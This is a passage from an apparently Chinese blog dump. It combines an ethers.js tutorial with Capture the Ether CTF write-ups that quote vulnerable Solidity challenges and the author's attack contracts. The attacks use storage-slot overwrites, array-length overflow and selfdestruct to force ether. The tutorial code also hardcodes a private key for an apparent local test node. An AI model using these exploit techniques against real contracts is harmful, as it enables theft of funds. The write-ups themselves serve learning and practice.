_slot0, address _slot1, string memory _slot2) payable&quot;, ....... ] */ // 读取文件的abi const ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString()); // 读取文件的bytecode const byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString(); 3. 创建合约工厂ContractFactory实例 ```js // 创建合约工厂 ContractFactory 实例 const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet); 4. 调用工厂合约的deploy() 函数并填入构造函数的参数，部署demo2合约并获取合约实例。有写常用方法： - `contract.address`获取合约地址， - `contract.deployTransaction`获取部署详情， - `contractERC20.deployed()`等待合约部署在链上确认。 ```js // 利用 factoryDemo2 部署demo2 合约 const gasPrice = await provider.getGasPrice(); const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;; const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction); console.log(`部署得到的合约地址：$&#123;constract.address&#125;`); console.log(&quot;部署合约的交易详情&quot;); console.log(constract.deployTransaction); 调用合约函数 12345678910111213/** * 调用合约的函数 */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`); let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 执行结果： 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);// 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString());// 读取文件的bytecodeconst byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString();// 创建合约工厂 ContractFactory 实例const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet);// 利用 factoryDemo2 部署demo2 合约const gasPrice = await provider.getGasPrice();const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;;const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction);console.log(`部署得到的合约地址：$&#123;constract.address&#125;`);console.log(&quot;部署合约的交易详情&quot;);console.log(constract.deployTransaction);/** * 调用合约的函数 */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 8.检索事件 — 很有用8.1 参考博客：请移步 这里8.2 检索事件 可以利用Ethers中合约类型的queryFilter()函数读取合约释放的事件 1const transferEvents = await contract.queryFilter(&#x27;事件名&#x27;,起始区块，结束区块) queryFilter() 包含3个参数，分别是事件名（必填），起始区块（选填），和结束区块（选填）。检索结果会以数组的形式返回。 注：要检索的事件必须包含在合约的abi中。 9. 监听合约事件9.1 监听合约事件 contract.on 在ethersjs中，合约对象有一个contract.on 的监听方法，让我们持续监听合约的事件： 1contract.on(&quot;eventName&quot;, function) contract.on 有两个参数，一个是要监听的事件名称”eventName”，需要包含合约abi中；另一个是我们在事件发生时调用的函数 contract.once 合约对象有一个contract.once的监听方法，让我们只监听一次合约释放事件，它的参数与contract.on一样： 1contract.once(&quot;eventName&quot;,function) 9.2 监听合约示例在这里 —-&gt; here ………………… 10. 事件过滤现阶段的我还不适合考虑这些，日后再学 博客链接 ………………… 11. BigNumber 和 单位转换11.1 BigNumber 在以太坊中，许多计算都对JavaScript整数的安全值（js中最大安全数为9007199254740991）。因此，ethers.js使用BigNumber 类安全地对任何数量级的数字进行数学运算。在ethers.js中，大多数需要返回值的操作将返回BigNumber，而接受值的参数也会接受他们。 BigNumber官方文档 11.2 创建BigNumber实例 可以利用 ethers.BigNumber.from() 函数将string，number，BigNumber等类型转换为BigNumber。 注：超过js最大安全整数的数值将不能转换 1234567const oneGwei = ethers.BigNumber.from(&quot;1000000000&quot;); // 从十进制字符串生成console.log(oneGwei)console.log(ethers.BigNumber.from(&quot;0x3b9aca00&quot;)) // 从hex字符串生成console.log(ethers.BigNumber.from(1000000000)) // 从数字生成// 不能从js最大的安全整数之外的数字生成BigNumber，下面代码会报错// ethers.BigNumber.from(Number.MAX_SAFE_INTEGER);console.log(&quot;js中最大安全整数：&quot;, Number.MAX_SAFE_INTEGER) 运行结果： 11.3 BigNumber运算 BigNumber支持很多运算，例如加减乘除、取模mod，幂运算pow，绝对值abs等运算： 1234567// 运算console.log(&quot;加法：&quot;, oneGwei.add(1).toString())console.log(&quot;减法：&quot;, oneGwei.sub(1).toString())console.log(&quot;乘法：&quot;, oneGwei.mul(2).toString())console.log(&quot;除法：&quot;, oneGwei.div(2).toString())// 比较console.log(&quot;是否相等：&quot;, oneGwei.eq(&quot;1000000000&quot;)) 运行结果： 11. 4 单位转换 以太坊中，1 ethers 等于 10^18wei。下面是一些常用的单位： 在应用中，我们经常将数值在用户可读的字符串（以ether为单位）和机器可读的数值（以wei为单位）之间转换。例如，钱包可以为用户界面指定余额（以ether为单位）和gas价格（以gwei为单位），但是在发送交易时，两者都必须转换成以wei为单位的数值。ethers.js提供了一些功能函数，方便这类转换。 formatUnits(变量, 单位)：格式化，小单位转大单位，比如wei -&gt; ether，在显示余额时很有用。参数中，单位填位数（数字）或指定的单位（字符串）。 123456789101112131415//代码参考：https://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n2. 格式化：小单位转大单位，formatUnits&#x27;);console.log(ethers.utils.formatUnits(oneGwei, 0));// &#x27;1000000000&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, 9));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;ether&quot;));// `0.000000001`console.log(ethers.utils.formatUnits(1000000000, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatEther(oneGwei));// `0.000000001` 等同于formatUnits(value, &quot;ether&quot;)console.groupEnd(); 运行结果： parseUnits：解析，大单位转小单位，比如ether -&gt; wei，在将用户输入的值转为wei为单位的数值很有用。参数中，单位填位数（数字）或指定的单位（字符串）。 1234567891011121314151617// 3. 解析：大单位转小单位// 例如将ether转换为wei：parseUnits(变量, 单位),parseUnits默认单位是 ether// 代码参考：https://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n3. 解析：大单位转小单位，parseUnits&#x27;);console.log(ethers.utils.parseUnits(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;ether&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 18).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;gwei&quot;).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 9).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseEther(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125; 等同于parseUnits(value, &quot;ether&quot;)console.groupEnd(); 运行结果： 12. CallStaticcallStatic方法是属于ethers.Contract类的编写方法分析，同类的还有populateTransaction和estimateGas方法 12.1 可能失败的交易 在以太坊上交易需要支付昂贵的gas，并且有失败的风险，发送失败的交易并不会把gas返还给你。因此，在发送交易前知道哪些交易可能会失败非常重要。以小狐狸钱包（metamask）为例。 如果交易将失败，小狐狸会告诉你 this transaction may fail，翻译过来就是”这笔交易可能会失败”。当用户看到提示的时候，就可以取消交易了。 实现的原理：以太坊节点有一个eth_call方法，让用户可以模拟一笔交易，并返回可能的交易结果，但不是真正的在区块链上执行（交易不上链）。 12.2 callStatic 在ethers.js中你可以利用contract对象的callStatic()来调用以太坊节点的eth_call。如果调用成功，则返回ture；如果失败，则报错并返回失败原因。方法： 12const tx = await contract.callStatic.函数名( 参数, &#123;override&#125;)console.log(`交易会成功吗？：`, tx) 函数名：为模拟调用的函数名。 参数：调用函数的参数。 {override}：选填，可包含一下参数： from：执行时的msg.sender，也就是你可以模拟任何一个人的调用，比如V神。 value：执行时的msg.value。 blockTag：执行时的区块高度。 gasPrice gasLimit nonce 12.3 用callStatic 模拟DAI转账演示过程—-》博客 13. 编码 calldata13.1 接口类Interface ethers.js 的接口类抽象了与以太坊网络的合约交互所需的ABI编码和解码。ABI与API类似，是一格式，用于对合约可以处理的各种类型的数据进行编码，以便它们可以交互。 可以利用abi生成或者直接从合约中获取interface变量： 1234// 利用abi生成const interface = new ethers.utils.Interface(abi)// 直接从contract中获取const interface2 = contract.interface 接口类封装了一些编码解码的方法。与一些特殊的合约交互时（比如代理 合约），你需要编码参数、解码返回值： 注：相关函数必须包含在abi中。 getSighash():获取函数选择器（function selector），参数为函数名或函数签名。 至于函数签名如何获取，在remix上使用keccak256()或的和ethersjs使用keccak256()获取的结果完全不一样，日后空闲了再仔细深入学习 12interface.getSighash(&quot;balanceOf&quot;);// &#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27; encodeDeploy()：编码构造器的参数，然后可以附在合约字节码的后面。 1interface.encodeDeploy(&quot;Wrapped ETH&quot;, &quot;WETH&quot;); encodeFunctionData()：编码函数的calldata。 1interface.encodeFunctionData(&quot;balanceOf&quot;, [&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;]); decodeFunctionResult()：解码函数的返回值。 1interface.decodeFunctionResult(&quot;balanceOf&quot;, resultData)","categories":[{"name":"Ethers.js","slug":"Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/"},{"name":"Basic_Knowledge","slug":"Ethers-js/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/Basic-Knowledge/"}],"tags":[{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"}]},{"title":"Public Key","slug":"Smart contracts/capther the ether/Public Key","date":"2023-04-24T07:50:10.000Z","updated":"2023-04-24T07:50:10.000Z","comments":true,"path":"2023/04/24/Smart contracts/capther the ether/Public Key/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/Smart%20contracts/capther%20the%20ether/Public%20Key/","excerpt":"","text":"Public Key1. 题目2. 分析3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fuzzy identity","slug":"Smart contracts/capther the ether/Fuzzy identity","date":"2023-04-17T02:50:10.000Z","updated":"2023-04-17T02:50:10.000Z","comments":true,"path":"2023/04/17/Smart contracts/capther the ether/Fuzzy identity/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/Smart%20contracts/capther%20the%20ether/Fuzzy%20identity/","excerpt":"","text":"Fuzzy identity1. 题目 1.1 This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work: I always use a wallet contract that returns “smarx” if you ask its name. Everything I write has bad code in it, so my address always includes the hex string badc0de. To complete this challenge, steal my identity! 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32(&quot;smarx&quot;); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;; bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; 2. 分析 2.1 分析代码可知，要是 isComplete的值为 true 需要成功调用 authenticate函数 2.2 但是需要通过两层校验，第一层简单，直接按要求编写一个名为name的函数皆可，第二个函数要求传入的地址是以 badc0de 结尾的，我在这里想到了使用 create2 的方法来构造一个以 badc0de结尾的地址，但是我有想法暂时还不能实现。。。。纠结：web3.utils.soliditySha3(param1 [, param2, ...]) 和 web3.utils.sha3(string) 看了网上大佬使用create2解法的更迷惑了 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fifty years","slug":"Smart contracts/capther the ether/Fifty years","date":"2023-04-17T02:30:10.000Z","updated":"2023-04-17T02:30:10.000Z","comments":true,"path":"2023/04/17/Smart contracts/capther the ether/Fifty years/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/Smart%20contracts/capther%20the%20ether/Fifty%20years/","excerpt":"","text":"Fifty years1. 题目 1.1 This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later. All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract 1.2 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.21;contract FiftyYearsChallenge &#123; // Contribution 结构体中包含了 金额和解锁时间 struct Contribution &#123; uint256 amount; uint256 unlockTimestamp; &#125; // Contribution 类型的数组 Contribution[] queue; uint256 head; address owner; function FiftyYearsChallenge(address player) public payable &#123; require(msg.value == 1 ether); // 初始化合约所有者为玩家，并把玩家的钱锁起来，直到五十年之后才可以解锁 owner = player; queue.push(Contribution(msg.value, now + 50 years)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function upsert(uint256 index, uint256 timestamp) public payable &#123; // 校验调用者是否为合约所有者 require(msg.sender == owner); // if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. // 这里storage 修饰的是创建的引用，修改contribution 的值也会影响到 queue[index]的值 Contribution storage contribution = queue[index]; // 盲猜这里有漏洞，覆盖 contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125; &#125; function withdraw(uint256 index) public &#123; require(msg.sender == owner); // 确保现在的时间大于或等于解锁时间 require(now &gt;= queue[index].unlockTimestamp); // Withdraw this and any earlier contributions. uint256 total = 0; for (uint256 i = head; i &lt;= index; i++) &#123; total += queue[i].amount; // Reclaim storage. delete queue[i]; &#125; // Move the head of the queue forward so we don&#x27;t have to loop over // already-withdrawn contributions. head = index + 1; msg.sender.transfer(total); &#125;&#125; 2. 分析3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Donation","slug":"Smart contracts/capther the ether/Donation","date":"2023-04-14T02:20:10.000Z","updated":"2023-04-14T02:20:10.000Z","comments":true,"path":"2023/04/14/Smart contracts/capther the ether/Donation/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/14/Smart%20contracts/capther%20the%20ether/Donation/","excerpt":"","text":"Donation1. 题目 1.1 A candidate you don’t like is accepting campaign contributions via the smart contract below. To complete this challenge, steal the candidate’s ether. 1.2 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.21;contract DonationChallenge &#123; struct Donation &#123; uint256 timestamp; uint256 etherAmount; &#125; Donation[] public donations; address public owner; function DonationChallenge() public payable &#123; require(msg.value == 1 ether); owner = msg.sender; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function donate(uint256 etherAmount) public payable &#123; // amount is in ether, but msg.value is in wei uint256 scale = 10**18 * 1 ether; require(msg.value == etherAmount / scale); Donation donation; donation.timestamp = now; donation.etherAmount = etherAmount; donations.push(donation); &#125; function withdraw() public &#123; require(msg.sender == owner); msg.sender.transfer(address(this).balance); &#125;&#125; 2.分析 2.1 本题的通过要求就是需要我们将合约中的钱全部偷走，合约中能够进行转钱操作的只有withdraw函数，所以我们只有将 require(msg.sender == owner) 这个校验通过才可以将合约中所有的钱转走 2.2 合约中有结构体，这点需要注意，分析源码可知 slot0 的位置存储的是 donations（里面具体的元素的存储位置在哪，之前遇到过，推荐文献），slot1 的位置存储的是 owner；但在函数donate 中 有一个为指明存储方式的声明语句Donation donation，这个结构体的声明默认是 storage 类型的，是需要上链的，当调用此函数的时候，会覆盖其他全局变量的插槽。 2.3 这恰好为我们篡改合约所有权提供了可能性，只要将 slot1位置的值覆盖为我们自己的账户地址即可成功执行withdraw函数了 2.4 需要在 donate 函数中修改 slot1的值，通过简单的数学计算就可以了 我不知道为什么我的这个攻击合约不行 1234567891011121314151617181920212223242526272829contract Hack &#123; DonationChallenge challenge; uint256 public etherAmount; function Hack(DonationChallenge _challenge) public &#123; challenge = _challenge; &#125; function computer(uint256 _address) public returns(uint256) &#123; // 记录下我的地址，并赋值给etherAmount，方便函数的调用 etherAmount = _address; //算出我要支付多少wei return (_address / (10 ** 36)); &#125; function att() public payable &#123; //修改slot1 即 owner的值 challenge.donate(etherAmount); // 偷钱 challenge.withdraw; &#125; function getAddress() external view returns(address) &#123; return msg.sender; &#125;&#125; tips：问了同学才知道原因：①是因为没给题目合约中的donate函数发送主币，过不了donation中的语句 ②withdraw函数中的 require(msg.sender == owner);校验过不去，因为在智能合约中，谁调用withdraw，谁就是msg.sender;合约调用，那么msg.sender就是合约 这样一来 challenge.withdraw; 中的msg.sender就是 challenge，所以就会报错 在0.4的编译器中发送主币的方式是： challenge.donate.value(msg.value)(etherAmount); 12345678function att() public payable &#123; //修改slot1 即 owner的值 //// address(nameReg).call.value(1 ether)(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;)); challenge.donate.value(msg.value)(etherAmount); // 偷钱 // challenge.withdraw; &#125; 这样改就可以成功修改合约的所有者了 3. 解题 3.1 部署 DonationChallenge 和 Hack 合约 3.2 攻击之前，可以看到合约所有者不是本人 3.3 计算出我需要支付的费用，参数是我的账户地址 3.4 以我的账户地址为参数，计算结果为 msg.value 调用 Donation 函数，再执行 withdrawn函数，将钱取走，再验证isComplete的值 成功","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Mapping","slug":"Smart contracts/capther the ether/Mapping","date":"2023-04-13T07:20:10.000Z","updated":"2023-04-13T07:20:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Mapping/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Mapping/","excerpt":"","text":"Mapping1. 题目 1.1 Who needs mappings? I’ve created a contract that can store key&#x2F;value pairs using just an array. 1.2 源码： 12345678910111213141516171819pragma solidity ^0.4.21;contract MappingChallenge &#123; bool public isComplete; uint256[] map; function set(uint256 key, uint256 value) public &#123; // Expand dynamic array as needed if (map.length &lt;= key) &#123; map.length = key + 1; &#125; map[key] = value; &#125; function get(uint256 key) public view returns (uint256) &#123; return map[key]; &#125;&#125; 2. 分析 2.1 最开始题目我是不理解的，上网搜了一下之后才知道，是要让 isComplete 的值返回的 是 true ，但是我是无从下手的，源码中没有提供修改 isComplete 值的函数 2.2 去网上搜索解题过程的时候，看到了说只要让动态数组 map 溢出将原来 isComplete 所处的 slot0位置 给覆盖即可将 未赋值的 isComplete 的值转化为 true（这里还是不太理解的） 2.3 知道怎么做之后就可以分析如何实现数组的溢出 a. 一个合约的存储最大容量可以看成是一个非常大的数组，最初全是零。数组中的每个值都是 32 字节宽，并且有 2 ^256个这样的值。简单来说就是有 2^256 个 key , 每一个key可以装下 32bytes（1uint &#x3D; 1uint256&#x3D;1bytes32&#x3D;32bytes）题目说明了map 是uint256 类型的数组，也就是说，map 数组中的每一元素占用一个slot，这就说明可以不用考虑几个元素挤在一个slot的情况了 b. 动态数组在EVM上存储的位置很复杂，他会根据你动态数组声明的位置，即 slot的位置进行hash计算出索引0实际存储的位置，从而开辟一段连续的空间用于存储数据元素， 参考文献 c. 又因为数组溢出之后，又会从EVM的虚拟数组从索引为0的位置（即slot0）开始存储，就会覆盖原来合约中的数据（即isComplete），***数组的起始位置是通过keccak256(bytes32(“数组长度所在插槽”))计算*** d. 计算 slot0 的位置 ： 12 ** 256 - 1 - uint256(keccak256(slot)) + 1 2.4 攻击合约： 123456789101112131415161718192021222324252627contract Hack &#123; MappingChallenge challenge; function Hack(MappingChallenge _challenge) public &#123; challenge = _challenge; &#125; function att(uint256 slot) public&#123; // 计算出map[0]被hash后分配的位置 uint start = uint256(keccak256(slot)); //计算出start 到EVM数组末尾的长度 // 2 ** 256 - 1 ==&gt;&gt; 是EVM数组的长度 [0,2 ** 256 - 1] uint length = 2 ** 256 - 1 - start; // 此时start + length 应该是等于 2 ^ 256 // 验证了猜想 // return start + length; // 因为 2 ** 256 - 1 + 1 = 0 // return length + 1; challenge.set(length+1, 1); &#125;&#125; 3. 解题 3.1 部署 MappingChallenge合约，部署 Hack 合约 3.2 将map 所处的插槽位置作为形参，调用att函数 3.3 回到 MappingChallenge 合约中查看 isComplete的值已经变成了true","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Retirement fund","slug":"Smart contracts/capther the ether/Retirement fund","date":"2023-04-13T06:58:10.000Z","updated":"2023-04-13T06:58:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Retirement fund/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Retirement%20fund/","excerpt":"","text":"Retirement fund1. 题目 1.1 This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement. I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!). I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck! 翻译： 这个退休基金就是经济学家所说的承诺机制。我正在努力确保我在退休时保留 1 个以太币。 我已经向下面的合约承诺了 1 个以太币，并且在 10 年过去之前我不会撤回它。如果我提早退出，我的 10% 的以太币会流向beneficiary（你！）。 我真的不想让你拥有我的 0.1 个以太币，所以我决定在 10 年后再单独使用这些资金。祝你好运！ 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.4.21;contract RetirementFundChallenge &#123; uint256 startBalance; address owner = msg.sender; address beneficiary; uint256 expiration = now + 10 years; function RetirementFundChallenge(address player) public payable &#123; require(msg.value == 1 ether); beneficiary = player; startBalance = msg.value; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function withdraw() public &#123; require(msg.sender == owner); if (now &lt; expiration) &#123; // early withdrawal incurs a 10% penalty msg.sender.transfer(address(this).balance * 9 / 10); &#125; else &#123; msg.sender.transfer(address(this).balance); &#125; &#125; function collectPenalty() public &#123; require(msg.sender == beneficiary); uint256 withdrawn = startBalance - address(this).balance; // an early withdrawal occurred require(withdrawn &gt; 0); // penalty is what&#x27;s left msg.sender.transfer(address(this).balance); &#125;&#125; 2.分析 2.1 题目的要求是将合约的钱全部取走，而不是取走合约所有者剩下的那 0.1 ether 2.2 所以我们将重点关注 collectPenalty 函数，成功执行msg.sender.transfer(address(this).balance);这行代码；而要执行这行代码执行要通过两个校验。校验一：require(msg.sender == beneficiary);验证你是否是受益人， 校验二：withdrawn = startBalance - address(this).balance &gt; 0 验证合约所有者是否提前取款了，提前取款就可以往下执行 2.3 但是我们可以通过下溢的方法让 withdrawn 的值大 0，就是让 address(this).balance 的值大于 1ehter，而合约中没有可以接收主币的函数，这就需要我们使用 selfdestruct命令，将某个合约的钱强行转给指定合约 2.4 所以我们可以编写一个攻击合约，往合约中发送一点主币，再执行自毁命令 攻击合约： 12345678contract Hack &#123; function Hack(address _address) public payable &#123; // RetirementFundChallenge retiement = RetirementFundChallenge(_address); selfdestruct(_address); &#125;&#125; 3.解题 3.1 部署 RetirementFundChallenge合约 3.2 部署 Hack 合约，给 RetirementFundChallenge合约 转入 1 ether 3.3 调用 collecPenalt函数 查看isComplete的值变成了 true","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token whale","slug":"Smart contracts/capther the ether/Token whale","date":"2023-04-13T06:01:10.000Z","updated":"2023-04-13T06:01:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Token whale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Token%20whale/","excerpt":"","text":"Token whale1. 题目 1.1 要求： This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge 1.2 源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; totalSupply = 1000; balanceOf[player] = 1000; &#125; function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; event Transfer(address indexed from, address indexed to, uint256 value); function _transfer(address to, uint256 value) internal &#123; balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; function transfer(address to, uint256 value) public &#123; require(balanceOf[msg.sender] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; require(balanceOf[from] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; _transfer(to, value); &#125;&#125; 2. 分析 2.1 首先对代码进行解读，慢慢看懂代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pragma solidity 